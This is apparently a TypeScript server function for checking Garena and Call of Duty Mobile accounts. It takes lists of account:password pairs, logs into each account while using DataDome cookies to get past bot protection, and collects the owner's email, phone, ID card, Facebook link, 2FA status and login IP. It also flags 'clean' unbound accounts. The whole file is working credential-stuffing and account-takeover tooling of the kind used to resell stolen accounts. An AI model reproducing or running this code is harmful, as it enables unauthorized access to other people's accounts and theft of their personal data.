    const oldCallbackUrl = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
    
    const oldResponse = await fetch(oldCallbackUrl, {
      method: 'GET',
      headers: {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
        'referer': 'https://auth.garena.com/'
      },
      redirect: 'manual'
    });

    const oldLocation = oldResponse.headers.get('location') || '';
    console.log('[CODM_CALLBACK] Old endpoint location:', oldLocation.substring(0, 100));
    
    if (oldLocation.includes('err=3')) {
      // Try AOS endpoint before returning no_codm
    } else if (oldLocation.includes('token=')) {
      const token = oldLocation.split('token=')[1]?.split('&')[0];
      if (token) return { token, status: 'success' };
    }
    
    // Method 2: Try new AOS endpoint
    const aosCallbackUrl = `https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
    
    const aosResponse = await fetch(aosCallbackUrl, {
      method: 'GET',
      headers: {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
        'referer': 'https://100082.connect.garena.com/',
        'x-requested-with': 'com.garena.game.codm'
      },
      redirect: 'manual'
    });

    const aosLocation = aosResponse.headers.get('location') || '';
    console.log('[CODM_CALLBACK] AOS endpoint location:', aosLocation.substring(0, 100));
    
    if (aosLocation.includes('err=3')) {
      return { token: null, status: 'no_codm' };
    }
    
    if (aosLocation.includes('token=')) {
      const token = aosLocation.split('token=')[1]?.split('&')[0];
      if (token) return { token, status: 'success' };
    }
    
    // If old endpoint had err=3, report no_codm
    if (oldLocation.includes('err=3')) {
      return { token: null, status: 'no_codm' };
    }
    
    return { token: null, status: 'unknown_error' };
  } catch (e) {
    console.log('[CODM_CALLBACK] Error:', e);
    return { token: null, status: 'error' };
  }
}

// Get CODM user info - matches v7.py get_codm_user_info()
// First tries JWT decode, then falls back to AOS API endpoint
async function getCodmUserInfo(token: string): Promise<Record<string, unknown> | null> {
  try {
    // Method 1: Try JWT decode first (faster, no network request)
    try {
      const parts = token.split('.');
      if (parts.length === 3) {
        let payload = parts[1];
        // Add padding
        const padding = 4 - (payload.length % 4);
        if (padding !== 4) {
          payload += '='.repeat(padding);
        }
        
        // Base64url decode
        const decoded = atob(payload.replace(/-/g, '+').replace(/_/g, '/'));
        const jwtData = JSON.parse(decoded);
        
        const userData = jwtData.user || {};
        if (userData && (userData.codm_nickname || userData.nickname)) {
          console.log('[CODM_USER] Got info from JWT decode');
          return {
            codm_nickname: userData.codm_nickname || userData.nickname || 'N/A',
            codm_level: userData.codm_level || 'N/A',
            region: userData.region || 'N/A',
            uid: userData.uid || 'N/A',
            open_id: userData.open_id || 'N/A',
            t_open_id: userData.t_open_id || 'N/A'
          };
        }
      }
    } catch (e) {
      console.log('[CODM_USER] JWT decode failed, trying API...');
    }
    
    // Method 2: Try AOS API endpoint (matching v7.py)
    const aosUrl = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/";
    const aosResponse = await fetch(aosUrl, {
      method: 'GET',
      headers: {
        'accept': 'application/json, text/plain, */*',
        'codm-delete-token': token,
        'origin': 'https://delete-request-aos.codm.garena.co.id',
        'referer': 'https://delete-request-aos.codm.garena.co.id/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
        'x-requested-with': 'com.garena.game.codm'
      }
    });

    const aosData = await aosResponse.json();
    console.log('[CODM_USER] AOS Response:', JSON.stringify(aosData).substring(0, 200));
    
    if (aosData.user) {
      return {
        codm_nickname: aosData.user.codm_nickname || 'N/A',
        codm_level: aosData.user.codm_level || 'N/A',
        region: aosData.user.region || 'N/A',
        uid: aosData.user.uid || 'N/A',
        open_id: aosData.user.open_id || 'N/A',
        t_open_id: aosData.user.t_open_id || 'N/A'
      };
    }
    
    // Method 3: Fallback to old endpoint
    const oldUrl = "https://api-delete-request.codm.garena.co.id/oauth/check_login/";
    const oldResponse = await fetch(oldUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json, text/plain, */*',
        'codm-delete-token': token,
        'Origin': 'https://delete-request.codm.garena.co.id',
        'Referer': 'https://delete-request.codm.garena.co.id/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 Chrome/107.0.0.0 Mobile Safari/537.36'
      }
    });

    const oldData = await oldResponse.json();
    console.log('[CODM_USER] Old Response:', JSON.stringify(oldData).substring(0, 200));
    
    if (oldData.user) {
      return {
        codm_nickname: oldData.user.codm_nickname || 'N/A',
        codm_level: oldData.user.codm_level || 'N/A',
        region: oldData.user.region || 'N/A',
        uid: oldData.user.uid || 'N/A',
        open_id: oldData.user.open_id || 'N/A',
        t_open_id: oldData.user.t_open_id || 'N/A'
      };
    }
    
    return null;
  } catch (e) {
    console.log('[CODM_USER] Error:', e);
    return null;
  }
}

// Parse account details - matches v7.py parse_account_details()
function parseAccountDetails(data: Record<string, unknown>): Record<string, unknown> {
  const userInfo = (data.user_info || data) as Record<string, unknown>;
  
  const email = (userInfo.email as string) || 'N/A';
  const emailVerified = Boolean(userInfo.email_v);
  const mobileNo = (userInfo.mobile_no as string) || '';
  const fbConnected = Boolean(userInfo.is_fbconnect_enabled);
  const fbAccount = (userInfo.fb_account as Record<string, unknown>) || {};
  const idCard = (userInfo.idcard as string) || '';
  const accCountry = (userInfo.acc_country as string) || 'N/A';
  const countryCode = (userInfo.country_code as string) || 'N/A';
  
  // Build binds array - matching v7.py logic exactly
  const binds: string[] = [];
  if (email && email !== 'N/A' && !email.startsWith('***') && email.includes('@') && !email.endsWith('@gmail.com') && !email.includes('****')) {
    binds.push('Email');
  }
  if (mobileNo && mobileNo.trim()) binds.push('Phone');
  if (fbConnected) binds.push('Facebook');
  if (idCard && idCard.trim()) binds.push('ID Card');
  
  // Clean status: clean only if no email verified AND no binds
  const isClean = !emailVerified && binds.length === 0;
  
  // Security info
  const twoStepVerify = Boolean(userInfo.two_step_verify_enable);
  const authenticator = Boolean(userInfo.authenticator_enable);
  const suspicious = Boolean(userInfo.suspicious);
  
  const securityIndicators: string[] = [];
  if (twoStepVerify) securityIndicators.push('2FA');
  if (authenticator) securityIndicators.push('Auth App');
  if (suspicious) securityIndicators.push('Suspicious');
  
  // Facebook details
  const fbUid = typeof fbAccount === 'object' && fbAccount ? (fbAccount.fb_uid as string) || 'N/A' : 'N/A';
  const fbLinked = fbConnected ? `Linked (${fbUid})` : 'Not Linked';
  const fbProfile = fbConnected && fbUid !== 'N/A' ? `https://facebook.com/${fbUid}` : 'N/A';
  
  // Login history
  const loginHistory = (data.login_history as Array<Record<string, unknown>>) || [];
  let lastLoginIp = 'N/A';
  let lastLoginWhere = 'N/A';
  let lastLogin = 'Unknown';
  
  if (Array.isArray(loginHistory) && loginHistory.length > 0) {
    const entry = loginHistory[0];
    lastLoginIp = (entry.ip as string) || (entry.login_ip as string) || (entry.ip_address as string) || 'N/A';
    lastLoginWhere = (entry.country as string) || (entry.location as string) || (entry.region as string) || 'N/A';
    const ts = entry.timestamp;
    if (ts) {
      try {
        const tsInt = Number(ts);
        lastLogin = new Date(tsInt * 1000).toISOString().replace('T', ' ').split('.')[0] + ' UTC';
      } catch { lastLogin = 'Unknown'; }
    }
  }
  
  return {
    uid: userInfo.uid || 'N/A',
    username: userInfo.username || 'N/A',
    nickname: userInfo.nickname || 'N/A',
    email: email,
    email_verified: emailVerified,
    country: accCountry,
    country_code: countryCode,
    shell_balance: userInfo.shell || 0,
    mobile_no: mobileNo || 'N/A',
    mobile_bound: mobileNo && mobileNo.trim() ? 'Yes' : 'No',
    is_clean: isClean,
    bind_status: isClean ? 'Clean' : `Bound (${binds.join(', ') || 'Email Verified'})`,
    binds: binds,
    two_step_verify: twoStepVerify,
    authenticator: authenticator,
    suspicious: suspicious,
    security_status: securityIndicators.length === 0 ? 'Normal' : securityIndicators.join(' | '),
    facebook_connected: fbConnected,
    facebook_linked: fbLinked,
    facebook_profile: fbProfile,
    facebook_uid: fbUid,
    avatar: userInfo.avatar || 'N/A',
    password_strength: userInfo.password_s || 'N/A',
    ip_address: (data.init_ip as string) || lastLoginIp || 'N/A',
    ip_country: (data.country as string) || 'N/A',
    last_login: lastLogin,
    last_login_where: lastLoginWhere,
    account_status: (userInfo.status as number) === 1 ? 'Active' : 'Inactive',
    real_name: userInfo.realname || 'N/A',
    id_card: idCard || 'N/A',
  };
}

// Check if CODM info is invalid - matching v7.py is_codm_invalid()
function isCodmInvalid(info: Record<string, unknown> | null): boolean {
  if (!info) return true;
  const invalidValues = ['', 'N/A', 'NONE', 'NULL', 'ERROR'];
  const allInvalid = Object.values(info).every(v => invalidValues.includes(String(v).trim().toUpperCase()));
  if (allInvalid) return true;
  const nickname = String(info.codm_nickname || '').trim().toUpperCase();
  if (invalidValues.includes(nickname)) return true;
  return false;
}

// Main check account function with retry logic
async function checkAccount(account: string, password: string): Promise<Record<string, unknown>> {
  console.log('[CHECK] Starting:', account);
  
  let lastError = '';
  
  for (let attempt = 0; attempt <= RETRY_CONFIG.maxRetries; attempt++) {
    if (attempt > 0) {
      console.log(`[CHECK] Retry attempt ${attempt}/${RETRY_CONFIG.maxRetries} for: ${account}`);
    }
    
    try {
      // Step 1: Get fresh DataDome cookie
      const datadome = get_cookies();
      // Cookie always available from pool
      
      // Step 2: Prelogin with internal retry on 403
      const preloginResult = await prelogin(account, datadome);
      if (!preloginResult) {
        lastError = 'Account not found or DataDome blocked';
        console.log('[CHECK] Prelogin failed, checking if retryable...');
        if (attempt < RETRY_CONFIG.maxRetries) {
          await retryDelay(attempt);
          continue;
        }
        return {
          account, password,
          status: 'invalid',
          message: lastError,
          isClean: false, hasCodm: false,
          retryAttempts: attempt + 1
        };
      }
      
      // Use updated datadome if prelogin returned one
      const activeDatdome = preloginResult.newDatadome || datadome;

      // Step 3: Login
      const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2, activeDatdome);
      if ('error' in loginResult) {
        console.log('[CHECK] Login failed:', loginResult.error);
        return {
          account, password,
          status: 'invalid',
          message: loginResult.error,
          isClean: false, hasCodm: false,
          retryAttempts: attempt + 1
        };
      }

      console.log('[CHECK] Login SUCCESS!');
      
      // Step 4: Get account info
      const accountData = await getAccountInfo(loginResult.ssoKey, activeDatdome);
      const details = accountData ? parseAccountDetails(accountData) : { is_clean: false };

      // Step 5: Check CODM using new OAuth flow (matching v7.py)
      let hasCodm = false;
      let codmInfo: Record<string, unknown> = {};
      
      const codmTokenResult = await getCodmAccessToken(loginResult.ssoKey, activeDatdome);
      if (codmTokenResult) {
        const callbackResult = await processCodmCallback(codmTokenResult.accessToken);
        if (callbackResult.status === 'success' && callbackResult.token) {
          const codmUser = await getCodmUserInfo(callbackResult.token);
          if (codmUser && !isCodmInvalid(codmUser)) {
            hasCodm = true;
            codmInfo = codmUser;
          }
        }
      }

      console.log(`[CHECK] Complete: valid, hasCodm=${hasCodm}, isClean=${details.is_clean}, attempts=${attempt + 1}`);

      return {
        account, password,
        status: 'valid',
        isClean: details.is_clean,
        hasCodm,
        details,
        codm: codmInfo,
        retryAttempts: attempt + 1
      };

    } catch (error) {
      lastError = error instanceof Error ? error.message : String(error);
      console.error(`[CHECK] Error on attempt ${attempt + 1}:`, lastError);
      
      if (attempt < RETRY_CONFIG.maxRetries) {
        await retryDelay(attempt);
        continue;
      }
    }
  }
  
  console.error('[CHECK] All retries exhausted for:', account);
  return {
    account, password,
    status: 'error',
    message: `Failed after ${RETRY_CONFIG.maxRetries + 1} attempts: ${lastError}`,
    isClean: false, hasCodm: false,
    retryAttempts: RETRY_CONFIG.maxRetries + 1
  };
}

// Input validation
interface ValidationResult {
  valid: boolean;
  errors: string[];
}

function validateAccountInput(accounts: unknown): ValidationResult {
  const errors: string[] = [];
  
  if (!Array.isArray(accounts)) {
    errors.push('Accounts must be an array');
    return { valid: false, errors };
  }
  
  if (accounts.length === 0) {
    errors.push('At least one account required');
    return { valid: false, errors };
  }
  
  if (accounts.length > 10) {
    errors.push('Maximum 10 accounts per request');
    return { valid: false, errors };
  }
  
  for (let i = 0; i < accounts.length; i++) {
    const line = accounts[i];
    
    if (typeof line !== 'string') {
      errors.push(`Account ${i + 1}: must be a string`);
      continue;
    }
    
    if (line.length > 500) {
      errors.push(`Account ${i + 1}: exceeds maximum length (500 chars)`);
      continue;
    }
    
    if (!/^[\x20-\x7E]+$/.test(line)) {
      errors.push(`Account ${i + 1}: contains invalid characters`);
      continue;
    }
    
    const parts = line.split(':');
    if (parts.length < 2) {
      errors.push(`Account ${i + 1}: invalid format (use account:password)`);
      continue;
    }
    
    const account = parts[0].trim();
    if (account.length < 3 || account.length > 100) {
      errors.push(`Account ${i + 1}: invalid account/email length`);
      continue;
    }
    
    const isValidUsername = /^[a-zA-Z0-9._-]+$/.test(account);
    const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(account);
    
    if (!isValidUsername && !isValidEmail) {
      errors.push(`Account ${i + 1}: invalid account format (use username or email)`);
      continue;
    }
    
    const password = parts.slice(1).join(':').trim();
    if (password.length < 1 || password.length > 200) {
      errors.push(`Account ${i + 1}: invalid password length`);
    }
  }
  
  return {
    valid: errors.length === 0,
    errors
  };
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const clientId = req.headers.get('x-forwarded-for') || 'unknown';
    console.log('[REQUEST] From:', clientId);

    const rateCheck = checkRateLimit(clientId);
    if (!rateCheck.allowed) {
      return new Response(
        JSON.stringify({ error: 'Rate limit exceeded', retryAfter: rateCheck.retryAfter }),
        { status: 429, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const contentLength = parseInt(req.headers.get('content-length') || '0');
    if (contentLength > 50000) {
      return new Response(
        JSON.stringify({ error: 'Request body too large' }),
        { status: 413, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const { accounts } = await req.json();

    const validation = validateAccountInput(accounts);
    if (!validation.valid) {
      return new Response(
        JSON.stringify({ error: 'Validation failed', details: validation.errors }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const results = [];
    
    for (const line of accounts.slice(0, 1)) {
      const parts = line.split(':');
      if (parts.length < 2) {
        results.push({ account: line, status: 'invalid', message: 'Invalid format' });
        continue;
      }
      
      const result = await checkAccount(parts[0].trim(), parts.slice(1).join(':').trim());
      results.push(result);
      console.log('[RESULT]', parts[0], ':', result.status);
    }

    return new Response(
      JSON.stringify({ results }),
      { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    console.error('[ERROR]', error);
    return new Response(
      JSON.stringify({ error: error instanceof Error ? error.message : 'Server error' }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
